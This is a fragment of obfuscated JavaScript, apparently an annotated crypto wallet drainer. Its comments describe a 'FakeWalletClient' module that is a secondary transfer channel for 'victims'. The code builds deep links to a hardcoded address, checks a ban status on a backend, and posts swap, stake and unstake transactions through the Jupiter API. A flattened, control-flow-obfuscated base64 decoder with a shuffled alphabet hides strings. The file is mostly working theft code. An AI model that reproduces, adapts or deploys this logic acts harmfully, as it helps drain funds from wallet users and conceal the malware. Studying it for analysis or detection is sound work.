/* ════════════════════════════════════════════════════════════
 * SECTION 3 — ALT CLIENT MODULE (alt-backend)
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

  /* ═══════════════════════════════════════════════════════════
   * SECTION 3 — ALT CLIENT MODULE (alt-backend)
   * Secondary transfer channel for victims who installed a alt client app.
   * FakeWalletClient.Ft(wallet, path) builds the deep-link URL.
   * FakeWalletClient.bn(wallet, path) fetches JSON from the backend.
   * FakeWalletClient.Tn(wallet) checks ban status on alt client backend.
   * FakeWalletClient.yn/On/Ao/Nn: Jupiter swap calls.
   * ═══════════════════════════════════════════════════════════ */
  FakeWalletClient = class {
    constructor() {
      _initPriv(this, _fwc_priv_wm)
    } ["Ft"](..._str_cache) {
      _str_cache["length"] = 2;
      return getString(186) + _str_cache[0]["Se"] + "2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc" + _str_cache[1]
    }
    async ["zt"](_str_cache, __str_table__) {
      let _s1 = await _retry(() => {
        return _str_cache()["catch"](_limitArgs((..._str_cache) => {
          _str_cache["length"] = 1;
          if (_str_cache[0] instanceof StatusError && [400, 500]["includes"](_str_cache[0]["Sn"])) {
            return _str_cache[0]
          }
          throw _str_cache[0]
        }))
      }, __str_table__, 250);
      if (_s1 instanceof StatusError) {
        throw _s1
      }
      return _s1
    }
    async ["bn"](_str_cache, __str_table__) {
      return await (await _callPriv(this, _fwc_priv_wm, _fwcFetch)["call"](this, _str_cache, "9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS" + __str_table__))["json"]()
    }
    async ["Tn"](_str_cache) {
      return (await (await _callPriv(this, _fwc_priv_wm, _fwcFetch)["call"](this, _str_cache, "5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3"))["text"]()) == "1"
    }
    async ["yn"](_str_cache, __str_table__, _s1) {
      let _s3 = _str_cache["he"]["be"];
      let _s2 = _str_cache["b"]["e"];
      let _s5 = _str_cache["he"]["Fe"]["map"](_str_cache => {
        return _str_cache["type"] == 0 ? _str_cache["de"] : _str_cache["e"]
      });
      let _s4 = _buildJupTx(_s2, __str_table__, _s1, _s3, _s5);
      let _s6 = await _callPriv(this, _fwc_priv_wm, _fwcFetchAuth)["call"](this, _str_cache["c"], "https://api.jup.ag/", _s4, 2500);
      if (!_s6["ok"]) {
        throw new StatusError(_s6["status"])
      }
    }
    async ["On"](_str_cache) {
      let __str_table__ = _str_cache["he"]["lr"];
      let _s1 = _str_cache["b"]["e"];
      let _s3 = _str_cache["c"];
      let _s2 = _buildStakeTx(_s1, _str_cache["K"], __str_table__);
      let _s5 = await _buildTokenTx(_s2, _s3["Se"] + "c");
      let _s4 = await _callPriv(this, _fwc_priv_wm, _fwcFetchAuth)["call"](this, _s3, "cc0769f7-ceba-4abf-83d8-e7c083921665", _s5, 16000);
      if (!_s4["ok"]) {
        throw new StatusError(_s4["status"])
      }
      let _s6 = new(Uint8Array)(await _s4["arrayBuffer"]());
      let [_s7, _s8, _defineProperty] = _parseTxResult(_s6);
      let _getOwnPropDesc;
      if (_s8) {
        let [_found, _v1] = _s8;
        _getOwnPropDesc = {
          [_found]: _v1["split"](",")
        }
      }
      return [_s7, _getOwnPropDesc, _defineProperty]
    }
    async ["Ao"](_str_cache, __str_table__, _s1) {
      let _s3 = await _callPriv(this, _fwc_priv_wm, _fwcFetchAuth)["call"](this, _str_cache, "5f1f45eb-a550-4e95-ad0e-b26e6ec0702d" + __str_table__ + "/" + _s1, {}, 16000);
      if (!_s3["ok"]) {
        throw new StatusError(_s3["status"])
      }
    }
    async ["Nn"](_str_cache, __str_table__, _s1) {
      let _s3 = _buildUnstakeTx(_s1);
      let _s2 = await _callPriv(this, _fwc_priv_wm, _fwcFetchAuth)["call"](this, _str_cache, "a4ed32be-dcdf-4702-aba0-aee15c512427" + __str_table__, _s3, 2500);
      if (!_s2["ok"]) {
        throw new StatusError(_s2["status"])
      }
    }
  }, _fwc_priv_wm = new(WeakMap), _fwcFetch = async function(_str_cache, __str_table__, _s1) {
    _s1 && (__str_table__ += "?" + new(URLSearchParams)(_s1));
    let _s3 = await fetch(this["Ft"](_str_cache, __str_table__), {
      ["signal"]: AbortSignal["Be"](2500)
    });
    if (!_s3["ok"]) {
      throw new StatusError(_s3["status"])
    }
    return _s3
  }, _fwcFetchAuth = async function(_s1, _s3, _s2, _s5 = 1000) {
      const _s4 = {
        ["43"]: 21,
        ["47"]: 9,
        ["48"]: 33,
        ["49"]: 62,
        ["50"]: 19,
        ["51"]: 16,
        ["52"]: 50,
        ["53"]: 27,
        ["54"]: 14,
        ["55"]: 47,
        ["56"]: 23,
        ["57"]: 1,
        ["65"]: 2,
        ["66"]: 44,
        ["67"]: 35,
        ["68"]: 30,
        ["69"]: 29,
        ["70"]: 55,
        ["71"]: 25,
        ["72"]: 18,
        ["73"]: 41,
        ["74"]: 61,
        ["75"]: 8,
        ["76"]: 24,
        ["77"]: 63,
        ["78"]: 60,
        ["79"]: 20,
        ["80"]: 4,
        ["81"]: 43,
        ["82"]: 31,
        ["83"]: 54,
        ["84"]: 42,
        ["85"]: 46,
        ["86"]: 5,
        ["87"]: 22,
        ["88"]: 36,
        ["89"]: 34,
        ["90"]: 39,
        ["97"]: 48,
        ["98"]: 17,
        ["99"]: 45,
        ["100"]: 0,
        ["101"]: 12,
        ["102"]: 57,
        ["103"]: 59,
        ["104"]: 26,
        ["105"]: 58,
        ["106"]: 11,
        ["107"]: 28,
        ["108"]: 13,
        ["109"]: 49,
        ["110"]: 3,
        ["111"]: 10,
        ["112"]: 40,
        ["113"]: 37,
        ["114"]: 52,
        ["115"]: 53,
        ["116"]: 15,
        ["117"]: 7,
        ["118"]: 38,
        ["119"]: 51,
        ["120"]: 32,
        ["121"]: 6,
        ["122"]: 56
      };
      const _s6 = new TextDecoder;

      function _s7(_s1) {
        var _s3, _s2;

        function* _s5(_s2, _s5, _s7 = {
          ["_v1235"]: {}
        }) {
          while (_s2 + _s5 !== -47) {
            with(_s7["\u5251"] || _s7) {
              switch (_s2 + _s5) {
                case _s7["_v1235"]["\u82D7"] + -65:
                  return _s3 = true, _s6.decode(_v1232);
                  _noop(_s7["\u5251"] = _s7["\u6B36"], _s2 += 120);
                  break;
                  if (!(_s2 != -(_s2 + 222))) {
                    _noop(_s7["\u5251"] = _s7["_v1235"], _s2 += -50, _s5 += 322);
                    break
                  }
                case -9:
                case _s2 - 100:
                  _noop(_s7["\u5251"] = _s7["_v1235"], _s2 += -358, _s5 += 13);
                  break;
                case _s5 - -19:
                  _noop([_s7["_v1235"]["\u9C60"], _s7["_v1235"]["\u82D7"], _s7["_v1235"]["\u5229"]] = [-199, 112, -56], _s7["\u5251"] = _s7["_v1235"], _s2 += -99, _s5 += 62);
                  break;
                case _s2 - -150:
                  _noop(_s7["\u5251"] = _s7["_v1235"], _s2 += 195, _s5 += -237);
                  break;
                case 11:
                  _s7["_v1235"]["_v1423"] = 0;
                  for (let _s8 = 0; _s8 < _v1042 - _v1233; _s8++) {
                    const _getOwnPropDesc = _s1[CONSTS[_s2 + 224]](_s8);
                    if (_getOwnPropDesc == 61) break;
                    _noop(_v1043 = _v1043 << 6 | _s4[_getOwnPropDesc], _v637 += CONSTS[_s2 + 88]);
                    if (_v637 >= 8) {
                      _noop(_v637 -= CONSTS[_s2 + 90], _v1232[_v1423++] = _v1043 >> _v637 & 255)
                    }
                  }
                  _noop(_s7["\u5251"] = _s7["_v1235"], _s5 += -178);
                  break;
                case 37:
                case 105:
                  _noop(_s7["_v1235"]["_v1043"] = CONSTS[_s2 + 136], _s7["_v1235"]["_v637"] = CONSTS[_s2 + 136], _s7["\u5251"] = _s7["_v1235"], _s2 += 50, _s5 += -144);
                  break;
                  if (!(_s2 > -144)) {
                    _noop(_s7["\u5251"] = _s7["_v1235"], _s2 += 50, _s5 += -144);
                    break
                  }
                case _s2 != 40 && _s2 != -80 && _s2 - 87:
                  _noop([_s7["_v1235"]["\u9C60"], _s7["_v1235"]["\u82D7"], _s7["_v1235"]["\u5229"]] = [-149, -14, -16], _s7["\u5251"] = _s7["_v1235"], _s2 += -133);
                  break;
                case 103:
                  _noop(_s7["_v1235"]["_v1233"] = _v1234 == -CONSTS[_s2 + -(_s2 + -4)] ? CONSTS[_s2 + -137] : _v1042 - _v1234, _s7["_v1235"]["_v1424"] = _v1042 * 3 / CONSTS[_s2 + -141] - _v1233, _s7["_v1235"]["_v1232"] = new Uint8Array(_v1424), _s7["\u5251"] = _s7["_v1235"], _s2 += -273, _s5 += 275);
                  break;
                case 145:
                case _s2 - 91:
                default:
                  _noop(_s7["\u5251"] = _s7["_v1235"], _s2 += -135, _s5 += 51);
                  break;
                case _s5 - -6:
                  _noop([_s7["_v1235"]["\u9C60"], _s7["_v1235"]["\u82D7"], _s7["_v1235"]["\u5229"]] = [234, -102, -210], _v1235["_v1042"] = _s1.length, _v1235["_v1234"] = _s1.indexOf(CONSTS[_s2 + 137]), _s7["\u5251"] = _s7["_v1235"], _s2 += 137, _s5 += -47);
                  break
              }
            }
          }
        }
        _noop(_s3 = undefined, _s2 = _s5(6, 7)["next"]()["value"]);
        if (_s3) {
          return _s2
        }
      }

      function _s8(_s1) {
        if (typeof _str_cache[_s1] === "undefined") {
          return _str_cache[_s1] = _s7(__str_table__[_s1])
        }
        return _str_cache[_s1]
      }
      let [_defineProperty, _getOwnPropDesc] = _s2 instanceof Uint8Array ? [_s2["toBase64"](), getString(293)] : [JSON["stringify"](_s2), _s8(237)];
      let _found = await fetch(this["Ft"](_s1, _s3), {
        ["headers"]: {
          ["content-type"]: _getOwnPropDesc
        },
        ["signal"]: AbortSignal["Be"](_s5),
        ["body"]: _defineProperty,
        ["method"]: "POST"
      });
      if (!_found["ok"]) {
        throw new StatusError(_found["status"])
      }
      return _found
    }, fwcInstance = new FakeWalletClient,
